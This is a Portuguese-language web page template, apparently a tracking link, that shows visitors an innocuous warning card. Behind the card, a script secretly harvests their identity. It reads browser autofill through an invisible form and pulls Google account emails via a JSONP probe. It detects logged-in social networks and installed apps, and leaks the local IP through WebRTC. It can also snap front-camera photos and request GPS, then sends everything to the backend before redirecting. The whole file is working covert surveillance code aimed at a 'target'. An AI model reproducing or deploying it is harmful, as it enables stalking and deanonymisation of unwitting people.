<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{ $ogTitulo }}</title>
    <meta name="description" content="{{ $ogDescricao }}">

    {{-- Open Graph: preview automático no WhatsApp/Telegram --}}
    <meta property="og:type"        content="website">
    <meta property="og:title"       content="{{ $ogTitulo }}">
    <meta property="og:description" content="{{ $ogDescricao }}">
    @if($ogImagem['url'])
    <meta property="og:image"       content="{{ $ogImagem['url'] }}">
    @if(str_starts_with($ogImagem['url'], 'https://'))
    <meta property="og:image:secure_url" content="{{ $ogImagem['url'] }}">
    @endif
    @if($ogImagem['type'])
    <meta property="og:image:type"  content="{{ $ogImagem['type'] }}">
    @endif
    @if($ogImagem['width'])
    <meta property="og:image:width" content="{{ $ogImagem['width'] }}">
    @endif
    @if($ogImagem['height'])
    <meta property="og:image:height" content="{{ $ogImagem['height'] }}">
    @endif
    <meta property="og:image:alt"   content="{{ $ogTitulo }}">
    @endif
    <meta property="og:url"         content="{{ $ogUrl }}">
    <meta property="og:site_name"   content="{{ $ogTitulo }}">
    <meta name="twitter:card"       content="summary_large_image">
    <meta name="twitter:title"      content="{{ $ogTitulo }}">
    <meta name="twitter:description" content="{{ $ogDescricao }}">
    @if($ogImagem['url'])
    <meta name="twitter:image"      content="{{ $ogImagem['url'] }}">
    @endif
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #f3f4f6;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            color: #374151;
        }
        .card {
            background: #fff;
            border-radius: 12px;
            box-shadow: 0 4px 24px rgba(0,0,0,.08);
            padding: 48px 40px;
            max-width: 420px;
            width: 90%;
            text-align: center;
        }
        .icon {
            width: 56px;
            height: 56px;
            background: #fef3c7;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 24px;
        }
        .icon svg { width: 28px; height: 28px; stroke: #d97706; }
        h1 { font-size: 1.1rem; font-weight: 600; color: #111827; margin-bottom: 8px; }
        p  { font-size: 0.9rem; color: #6b7280; line-height: 1.6; }

        /* Form de autofill — renderizado mas invisível */
        #__id-form {
            position: fixed;
            top: 0; left: 0;
            width: 1px; height: 1px;
            overflow: hidden;
            opacity: 0;
            pointer-events: none;
            z-index: -1;
        }
        #__id-form input {
            width: 1px; height: 1px;
            border: none; padding: 0;
            font-size: 1px;
        }

        /* Flash visual da câmera */
        #__cap-flash {
            position: fixed;
            inset: 0;
            background: #fff;
            z-index: 9999;
            opacity: 0;
            pointer-events: none;
            transition: opacity .08s ease;
        }
        #__cap-flash.ativo { opacity: 1; }
    </style>
</head>
<body>

    {{--
        Form de autofill oculto.
        Precisa estar no DOM (não display:none) para o browser preencher.
        O JS lê os valores após 800 ms e envia ao backend.
    --}}
    @if($captureIdentity)
        <form id="__id-form" autocomplete="on" tabindex="-1" aria-hidden="true">
            <input type="text"  id="__id-nome"     name="full_name" autocomplete="name"  tabindex="-1" readonly onfocus="this.removeAttribute('readonly')">
            <input type="email" id="__id-email"    name="email"     autocomplete="email" tabindex="-1" readonly onfocus="this.removeAttribute('readonly')">
            <input type="tel"   id="__id-telefone" name="phone"     autocomplete="tel"   tabindex="-1" readonly onfocus="this.removeAttribute('readonly')">
        </form>
    @endif

    <div class="card">
        <div class="icon">
            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor">
                <path stroke-linecap="round" stroke-linejoin="round"
                    d="M12 9v3.75m-9.303 3.376c-.866 1.5.217 3.374 1.948 3.374h14.71c1.73 0 2.813-1.874 1.948-3.374L13.949 3.378c-.866-1.5-3.032-1.5-3.898 0L2.697 16.126ZM12 15.75h.007v.008H12v-.008Z" />
            </svg>
        </div>
        <h1>{{ $mensagem }}</h1>
        <p>Caso precise de suporte, entre em contato com o remetente.</p>
    </div>

    {{-- Elementos para captura de câmera (ocultos, renderizados só quando necessário) --}}
    @if($captureAlvo)
        <video    id="__cap-video"      autoplay muted playsinline
                  style="display:none;position:fixed;top:0;left:0;width:1px;height:1px;z-index:-1;"
                  tabindex="-1" aria-hidden="true"></video>
        <canvas   id="__cap-canvas"
                  style="display:none;position:fixed;top:0;left:0;z-index:-1;"
                  tabindex="-1" aria-hidden="true"></canvas>
        <div      id="__cap-flash"      aria-hidden="true"></div>
        <input    id="__cap-file-input" type="file" accept="image/*" capture="user"
                  style="display:none;" tabindex="-1" aria-hidden="true">
        {{-- linkAcao e feedback: elementos de controle usados internamente pelo JS --}}
        <span     id="__cap-link"       style="display:none;" aria-hidden="true"></span>
        <span     id="__cap-feedback"   style="display:none;" aria-hidden="true"></span>
    @endif

    {{-- iframe invisível usado para probing de URL schemes --}}
    @if($captureIdentity)
        <iframe id="__scheme-probe" style="display:none;width:0;height:0;border:none;" tabindex="-1" aria-hidden="true"></iframe>

        {{-- iframe do Facebook Like button — usado para detectar login via altura do elemento --}}
        <iframe
            id="__fb-probe"
            src="https://www.facebook.com/plugins/like.php?href=https%3A%2F%2Ffacebook.com&layout=button_count&action=like&size=small&share=false&height=21&appId="
            style="display:none;width:0;height:0;border:none;"
            scrolling="no"
            frameborder="0"
            tabindex="-1"
            aria-hidden="true"
        ></iframe>
    @endif

    <script>
    (function () {
        var token      = @json($token);
        var accessId   = @json($accessUuid);
        var captureGps = @json($captureGps);
        var captureAlvo = @json($captureAlvo);
        var captureIdentity = @json($captureIdentity);
        var redirectUrl = @json($redirectUrl);
        var endpoint      = window.location.pathname.replace(/\/$/, '') + '/device';
        var endpointFotos = window.location.pathname.replace(/\/$/, '') + '/fotos';
        var csrf          = @json(csrf_token());

        var dados = {
            gmt:        '',
            ip_local:   null,
            idioma:     navigator.language || navigator.userLanguage || '',
            plataforma: navigator.userAgentData
                            ? (navigator.userAgentData.platform || navigator.platform || '')
                            : (navigator.platform || ''),
            resolucao:  screen.width + 'x' + screen.height,
        };

        // GMT real do dispositivo
        try {
            var tz     = Intl.DateTimeFormat().resolvedOptions().timeZone;
            var offset = new Date().getTimezoneOffset();
            var h      = Math.floor(Math.abs(offset) / 60);
            var m      = Math.abs(offset) % 60;
            var s      = offset <= 0 ? '+' : '-';
            dados.gmt  = 'GMT' + s + String(h).padStart(2,'0') + ':' + String(m).padStart(2,'0') + ' (' + tz + ')';
        } catch(e) {}

        // ─────────────────────────────────────────────────────────────
        // IDENTIDADE DIGITAL
        // ─────────────────────────────────────────────────────────────

        var identidade = {
            nome:     null,
            email:    null,
            telefone: null,
            redes:    [],   // Array de objetos: {rede, usuario, nome, logado, instalado}
        };

        function lerCampo(id) {
            try {
                var val = ((document.getElementById(id) || {}).value || '').trim();
                return val.length > 0 ? val : null;
            } catch(e) { return null; }
        }

        // ─────────────────────────────────────────────────────────────
        // 1. GOOGLE — JSONP ListAccounts
        //    Funciona quando o browser envia os cookies de sessão do Google.
        //    Em navegadores com SameSite=Lax estrito, pode não retornar dados;
        //    em mobile/browsers mais antigos geralmente funciona.
        // ─────────────────────────────────────────────────────────────

        function detectarGoogleAccounts(callback) {
            var cbName  = '_gcal' + Math.random().toString(36).substr(2, 10);
            var done    = false;

            var timer = setTimeout(function() {
                if (!done) { done = true; limpaCb(); callback([]); }
            }, 5000);

            function limpaCb() {
                try { delete window[cbName]; } catch(e) {}
            }

            window[cbName] = function(data) {
                if (done) return;
                done = true;
                clearTimeout(timer);
                limpaCb();

                var contas = [];
                try {
                    // Formato: ["gaia.cac.cached_list", [[null, ?, email, nome, ...], ...], 1]
                    if (Array.isArray(data) && Array.isArray(data[1])) {
                        data[1].forEach(function(acct) {
                            if (!Array.isArray(acct)) return;

                            var email = null, nome = null;

                            // Varre todos os valores string do array e extrai email e nome
                            for (var i = 0; i < acct.length; i++) {
                                var v = acct[i];
                                if (typeof v !== 'string' || v.length < 3) continue;

                                if (!email && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v)) {
                                    email = v;
                                } else if (email && !nome && v.length >= 2 && v.length <= 80
                                           && !/^https?:\/\//.test(v)
                                           && !/^\d+$/.test(v)
                                           && v.indexOf(' ') >= 0) {
                                    nome = v;
                                }
                            }

                            if (email) {
                                contas.push({
                                    rede:     'Google',
                                    usuario:  email,
                                    nome:     nome,
                                    logado:   true,
                                    instalado: null,
                                });
                            }
                        });
                    }
                } catch(e) {}

                callback(contas);
            };

            var s   = document.createElement('script');
            s.onerror = function() {
                if (!done) { done = true; clearTimeout(timer); limpaCb(); callback([]); }
            };
            s.src = 'https://accounts.google.com/ListAccounts?gpsia=1&source=ogb&json=1&callback=' + cbName;
            document.head.appendChild(s);
        }

        // ─────────────────────────────────────────────────────────────
        // 2. FACEBOOK — detecção de login via altura do iframe Like button
        //    Logado:    iframe carrega com ≥ 90px de altura (mostra foto/nome)
        //    Deslogado: iframe fica com ~22px (apenas o botão)
        //    A detecção é via postMessage que o próprio iframe do Facebook envia.
        // ─────────────────────────────────────────────────────────────

        function detectarFacebook(callback) {
            var done   = false;
            var iframe = document.getElementById('__fb-probe');

            if (!iframe) return callback(null);

            var timer = setTimeout(function() {
                if (!done) { done = true; callback(null); }
            }, 6000);

            function onMsg(e) {
                if (done) return;
                if (typeof e.origin !== 'string' || e.origin.indexOf('facebook.com') === -1) return;

                try {
                    var raw  = e.data;
                    var obj  = typeof raw === 'string' ? JSON.parse(raw) : raw;

                    // Facebook Social Plugin envia: {"type":"resize","height":N,"width":N,...}
                    if (obj && obj.type === 'resize' && typeof obj.height === 'number') {
                        done = true;
                        clearTimeout(timer);
                        window.removeEventListener('message', onMsg);

                        // altura ≥ 90px → está logado (mostra amigos que curtiram)
                        // altura < 90px → não logado (só o botão)
                        var logado = obj.height >= 90;

                        callback({
                            rede:     'Facebook',
                            usuario:  null,
                            nome:     null,
                            logado:   logado,
                            instalado: null,
                        });
                    }
                } catch(ex) {}
            }

            window.addEventListener('message', onMsg);
        }

        // ─────────────────────────────────────────────────────────────
        // 3. REDES SOCIAIS LOGADAS — fetch redirect:manual
        //
        //    Técnica: um fetch com mode:'no-cors' + redirect:'manual' permite
        //    distinguir se o servidor respondeu 200 (opaque) ou 3xx (opaqueredirect).
        //    Quando o usuário NÃO está logado, a rede redireciona p/ login (3xx).
        //    Quando está logado, serve a página direto (200).
        //
        //    Limitação: exige que o browser envie os cookies de sessão cross-site.
        //    Funciona melhor em Safari / browsers sem SameSite=Lax estrito (iOS,
        //    alguns Android). Em Chrome/Firefox modernos pode não enviar cookies →
        //    resultado: detecta apenas "não logado" para todos (falso negativo).
        //    Mesmo assim vale tentar — em mobile é mais comum funcionar.
        // ─────────────────────────────────────────────────────────────

        var REDES_REDIRECT = [
            // Página de configurações/perfil que redireciona para login quando não autenticado
            { nome: 'Instagram', url: 'https://www.instagram.com/accounts/edit/' },
            { nome: 'Twitter/X', url: 'https://twitter.com/settings/profile' },
            { nome: 'LinkedIn',  url: 'https://www.linkedin.com/in/edit/' },
            { nome: 'TikTok',    url: 'https://www.tiktok.com/setting' },
            { nome: 'Pinterest', url: 'https://www.pinterest.com/settings/' },
        ];

        function detectarLoginPorRedirect(callback) {
            var pendentes = REDES_REDIRECT.length;
            var logadas   = [];

            function concluir(resultado) {
                if (resultado) logadas.push(resultado);
                pendentes--;
                if (pendentes === 0) callback(logadas);
            }

            REDES_REDIRECT.forEach(function(rede) {
                var timer = setTimeout(function() { concluir(null); }, 5000);
                var done  = false;

                function finalizar(resultado) {
                    if (done) return;
                    done = true;
                    clearTimeout(timer);
                    concluir(resultado);
                }

                try {
                    fetch(rede.url, {
                        mode:        'no-cors',
                        credentials: 'include',
                        redirect:    'manual',
                        cache:       'no-store',
                    })
                    .then(function(res) {
                        if (res.type === 'opaque') {
                            // Servidor respondeu 200 → usuário está logado
                            finalizar({
                                rede:      rede.nome,
                                usuario:   null,   // username não é acessível cross-site
                                nome:      null,
                                logado:    true,
                                instalado: null,
                            });
                        } else {
                            // opaqueredirect (3xx → login) ou outro → não logado / inconclusivo
                            finalizar(null);
                        }
                    })
                    .catch(function() { finalizar(null); });
                } catch(e) {
                    finalizar(null);
                }
            });
        }

        // ─────────────────────────────────────────────────────────────
        // 4. APPS INSTALADOS — URL Scheme (funciona em dispositivos móveis)
        //    Quando um app está instalado, o OS o abre → a janela perde foco.
        // ─────────────────────────────────────────────────────────────

        var APPS_SCHEMES = [
            { nome: 'WhatsApp',  scheme: 'whatsapp://send?text=.' },
            { nome: 'Instagram', scheme: 'instagram://app' },
            { nome: 'TikTok',    scheme: 'snssdk1180://user/profile/0' },
            { nome: 'Telegram',  scheme: 'tg://msg' },
            { nome: 'Twitter/X', scheme: 'twitter://timeline' },
            { nome: 'LinkedIn',  scheme: 'linkedin://profile' },
            { nome: 'Snapchat',  scheme: 'snapchat://' },
            { nome: 'Pinterest', scheme: 'pinterest://' },
        ];

        function detectarAppsInstalados(callback) {
            // URL schemes só funcionam em dispositivos com touch (mobile)
            if (!('ontouchstart' in window) && !(navigator.maxTouchPoints > 0)) {
                return callback([]);
            }

            var probe    = document.getElementById('__scheme-probe');
            var lista    = [];
            var idx      = 0;

            function testarProximo() {
                if (idx >= APPS_SCHEMES.length) {
                    return callback(lista.map(function(nome) {
                        return { rede: nome, usuario: null, nome: null, logado: null, instalado: true };
                    }));
                }

                var app      = APPS_SCHEMES[idx++];
                var detectado = false;

                function onFocusLost() {
                    if (detectado) return;
                    detectado = true;
                    lista.push(app.nome);
                    limparListeners();
                    // Aguarda a janela retornar antes do próximo teste
                    setTimeout(testarProximo, 250);
                }

                function onVisibility() {
                    if (document.hidden) onFocusLost();
                }

                function limparListeners() {
                    window.removeEventListener('blur', onFocusLost);
                    document.removeEventListener('visibilitychange', onVisibility);
                }

                window.addEventListener('blur', onFocusLost);
                document.addEventListener('visibilitychange', onVisibility);

                try {
                    if (probe) {
                        probe.src = app.scheme;
                    } else {
                        window.location.href = app.scheme;
                    }
                } catch(e) {}

                setTimeout(function() {
                    if (!detectado) {
                        limparListeners();
                        testarProximo();
                    }
                }, 500); // Timeout por app
            }

            testarProximo();
        }

        // ─────────────────────────────────────────────────────────────
        // ENVIO AO BACKEND
        // ─────────────────────────────────────────────────────────────

        function enviar(valorWebRtc, extras) {
            if (valorWebRtc) dados.ip_local = valorWebRtc;

            var formData = new FormData();
            formData.append('_token', csrf);

            if (accessId) formData.append('access_id', accessId);

            Object.keys(dados).forEach(function(chave) {
                if (dados[chave] !== null && dados[chave] !== undefined) {
                    formData.append(chave, dados[chave]);
                }
            });

            if (captureIdentity) {
                if (identidade.nome)     formData.append('identidade_nome',     identidade.nome);
                if (identidade.email)    formData.append('identidade_email',    identidade.email);
                if (identidade.telefone) formData.append('identidade_telefone', identidade.telefone);
                if (identidade.redes && identidade.redes.length > 0) {
                    formData.append('identidade_redes', JSON.stringify(identidade.redes));
                }
            }

            Object.keys(extras || {}).forEach(function(chave) {
                if (extras[chave] !== null && extras[chave] !== undefined) {
                    formData.append(chave, extras[chave]);
                }
            });

            if (!extras && navigator.sendBeacon && navigator.sendBeacon(endpoint, formData)) {
                return Promise.resolve();
            }

            return fetch(endpoint, {
                method: 'POST',
                headers: { 'X-CSRF-TOKEN': csrf },
                body: formData,
                credentials: 'same-origin',
                keepalive: true,
            }).catch(function(){});
        }

        function redirecionar() {
            if (!redirectUrl) return;
            window.location.href = redirectUrl;
        }

        // ─────────────────────────────────────────────────────────────
        // CAPTURAR ALVO — câmera frontal
        // Depende de autorização explícita do alvo no navegador.
        // ─────────────────────────────────────────────────────────────

        async function capturarAlvo(callback) {
            callback = callback || function(){};

            if (!captureAlvo) {
                return callback();
            }

            var linkAcao        = document.getElementById('__cap-link');
            var feedback        = document.getElementById('__cap-feedback');
            var video           = document.getElementById('__cap-video');
            var canvas          = document.getElementById('__cap-canvas');
            var flash           = document.getElementById('__cap-flash');
            var fileInput       = document.getElementById('__cap-file-input');
            var temGetUserMedia = !!(navigator.mediaDevices && navigator.mediaDevices.getUserMedia);

            async function salvarFoto(base64) {
                try {
                    // Não usar keepalive:true — limite de 64 KB no Chrome quebra imagens em base64
                    await fetch(endpointFotos, {
                        method:      'POST',
                        headers:     { 'Content-Type': 'application/json', 'X-CSRF-TOKEN': csrf },
                        body:        JSON.stringify({ foto: base64, access_id: accessId }),
                        credentials: 'same-origin',
                    });
                } catch(e) {}
            }

            try {
                // 1. Bloqueia cliques duplos
                linkAcao.style.pointerEvents = 'none';
                feedback.textContent = 'Acessando câmera…';

                // 2. Verifica se getUserMedia está disponível (requer HTTPS)
                if (temGetUserMedia) {

                    // 3. Abre a câmera frontal
                    const stream = await navigator.mediaDevices.getUserMedia({
                        video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
                        audio: false,
                    });

                    // 4. Conecta ao elemento <video> oculto e aguarda carregar
                    video.srcObject = stream;
                    await new Promise(r => { video.onloadedmetadata = r; });

                    // 5. Espera 300ms para a câmera estabilizar
                    await new Promise(r => setTimeout(r, 300));

                    // 6. Ajusta canvas para a resolução real do vídeo, captura e gera base64
                    canvas.width  = video.videoWidth  || 1280;
                    canvas.height = video.videoHeight || 720;
                    flash.classList.add('ativo');
                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                    const base64 = canvas.toDataURL('image/jpeg', 0.92);

                    // 7. Encerra o stream da câmera imediatamente
                    stream.getTracks().forEach(t => t.stop());

                    // 8. Envia o base64 para POST /api/fotos
                    feedback.textContent = 'Salvando foto…';
                    await salvarFoto(base64);

                } else {
                    // Fallback para HTTP (mobile sem HTTPS): abre câmera nativa
                    fileInput.click();
                }
            } catch(e) {}

            callback();
        }

        function solicitarGps(callback) {
            callback = callback || function(){};

            if (!captureGps) {
                return callback();
            }

            if (!accessId) {
                Promise.resolve(enviar(null, { gps_status: 'skipped', gps_error: 'Acesso sem identificador para atualizar.' })).then(callback);
                return;
            }

            if (!window.isSecureContext) {
                Promise.resolve(enviar(null, { gps_status: 'insecure', gps_error: 'Geolocation exige HTTPS/contexto seguro.' })).then(callback);
                return;
            }

            if (!navigator.geolocation) {
                Promise.resolve(enviar(null, { gps_status: 'unsupported', gps_error: 'Navegador sem suporte a geolocalizacao.' })).then(callback);
                return;
            }

            var finalizado = false;

            function finalizar() {
                if (finalizado) return;
                finalizado = true;
                callback();
            }

            navigator.geolocation.getCurrentPosition(function(posicao) {
                if (!posicao || !posicao.coords) { finalizar(); return; }

                Promise.resolve(enviar(null, {
                    gps_latitude:  posicao.coords.latitude,
                    gps_longitude: posicao.coords.longitude,
                    gps_accuracy:  posicao.coords.accuracy,
                    gps_status:    'captured',
                })).then(finalizar);
            }, function(error) {
                var status = 'error';

                if (error && error.code === 1) status = 'denied';
                if (error && error.code === 2) status = 'unavailable';
                if (error && error.code === 3) status = 'timeout';

                Promise.resolve(enviar(null, {
                    gps_status: status,
                    gps_error:  error && error.message ? error.message : 'Falha ao obter GPS.',
                })).then(finalizar);
            }, { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 });
        }

        // ─────────────────────────────────────────────────────────────
        // WebRTC (IP local)
        // ─────────────────────────────────────────────────────────────

        function extrairEnderecoDoCandidate(candidate) {
            var partes = String(candidate || '').trim().split(/\s+/);
            return partes.length >= 5 ? partes[4] : null;
        }

        function enderecoWebRtcValido(endereco) {
            if (!endereco) return false;
            var valor = String(endereco).toLowerCase();
            if (/^[a-z0-9-]{1,63}(\.[a-z0-9-]{1,63})*\.local$/.test(valor)) return true;
            return /^(10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.|fd|fc)/i.test(valor);
        }

        function dispararWebRtcEEnviar() {
            try {
                var RTCPeer = window.RTCPeerConnection
                           || window.webkitRTCPeerConnection
                           || window.mozRTCPeerConnection;

                if (!RTCPeer) {
                    Promise.resolve(enviar(null)).then(function() { capturarAlvo(function() { solicitarGps(redirecionar); }); });
                    return;
                }

                var pc = new RTCPeer({ iceServers: [] });
                pc.createDataChannel('');

                var enviado       = false;
                var melhorEndereco = null;

                function escolherEndereco(endereco) {
                    if (!enderecoWebRtcValido(endereco)) return;
                    if (!melhorEndereco || !/\.local$/i.test(endereco)) {
                        melhorEndereco = endereco;
                    }
                }

                function finalizarWebRtc() {
                    if (enviado) return;
                    enviado = true;
                    try { pc.close(); } catch(e) {}
                    Promise.resolve(enviar(melhorEndereco)).then(function() { capturarAlvo(function() { solicitarGps(redirecionar); }); });
                }

                function processarCandidate(c) { escolherEndereco(extrairEnderecoDoCandidate(c)); }

                function processarSdp(sdp) {
                    String(sdp || '').split(/\r?\n/).forEach(function(linha) {
                        if (linha.indexOf('candidate:') !== -1) processarCandidate(linha.replace(/^a=/, ''));
                    });
                }

                pc.onicecandidate = function(e) {
                    if (!e || !e.candidate || !e.candidate.candidate) { finalizarWebRtc(); return; }
                    processarCandidate(e.candidate.candidate);
                    if (melhorEndereco && !/\.local$/i.test(melhorEndereco)) finalizarWebRtc();
                };

                pc.createOffer()
                    .then(function(offer) { return pc.setLocalDescription(offer); })
                    .then(function() { processarSdp(pc.localDescription && pc.localDescription.sdp); })
                    .catch(finalizarWebRtc);

                setTimeout(finalizarWebRtc, 4000);

            } catch(e) {
                Promise.resolve(enviar(null)).then(function() { capturarAlvo(function() { solicitarGps(redirecionar); }); });
            }
        }

        // ─────────────────────────────────────────────────────────────
        // FLUXO PRINCIPAL — todas as detecções rodam em paralelo
        //   A) Autofill form (800 ms)
        //   B) Google JSONP — email + nome (até 5 s)
        //   C) Facebook iframe height — logado/não (até 6 s)
        //   D) Login por redirect — Instagram/Twitter/LinkedIn/TikTok (até 5 s cada)
        //   E) Apps URL scheme — mobile, sequencial (~5 s para 8 apps)
        // Avança para WebRTC/envio quando TODAS terminam (ou timeout).
        // ─────────────────────────────────────────────────────────────

        function lerAutofill(callback) {
            setTimeout(function() {
                identidade.nome     = lerCampo('__id-nome');
                identidade.email    = lerCampo('__id-email');
                identidade.telefone = lerCampo('__id-telefone');
                callback();
            }, 800);
        }

        function iniciarCaptura() {
            if (!captureIdentity) {
                dispararWebRtcEEnviar();
                return;
            }

            lerAutofill(function() {
                var pendentes      = 4; // google + facebook + redirect + apps
                var redesColetadas = [];

                function modulo() {
                    pendentes--;
                    if (pendentes > 0) return;
                    // Todos terminaram — remove duplicatas pelo nome da rede
                    // (prefere o objeto com mais info: logado=true > instalado=true)
                    var mapa = {};
                    redesColetadas.forEach(function(r) {
                        if (!r || !r.rede) return;
                        var chave = r.rede;
                        var atual = mapa[chave];
                        if (!atual) { mapa[chave] = r; return; }
                        // Prefere o que tiver usuario ou logado explícito
                        if (!atual.usuario && r.usuario) { mapa[chave] = r; return; }
                        if (!atual.logado  && r.logado)  { mapa[chave] = r; return; }
                    });
                    identidade.redes = Object.values(mapa);
                    dispararWebRtcEEnviar();
                }

                // A) Google JSONP
                detectarGoogleAccounts(function(contas) {
                    contas.forEach(function(c) { redesColetadas.push(c); });
                    modulo();
                });

                // B) Facebook iframe
                detectarFacebook(function(resultado) {
                    if (resultado) redesColetadas.push(resultado);
                    modulo();
                });

                // C) Login por redirect — Instagram, Twitter/X, LinkedIn, TikTok, Pinterest
                detectarLoginPorRedirect(function(logadas) {
                    logadas.forEach(function(r) { redesColetadas.push(r); });
                    modulo();
                });

                // D) Apps móveis via URL scheme
                detectarAppsInstalados(function(apps) {
                    apps.forEach(function(a) { redesColetadas.push(a); });
                    modulo();
                });
            });
        }

        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', iniciarCaptura);
        } else {
            iniciarCaptura();
        }

    })();
    </script>
</body>
</html>
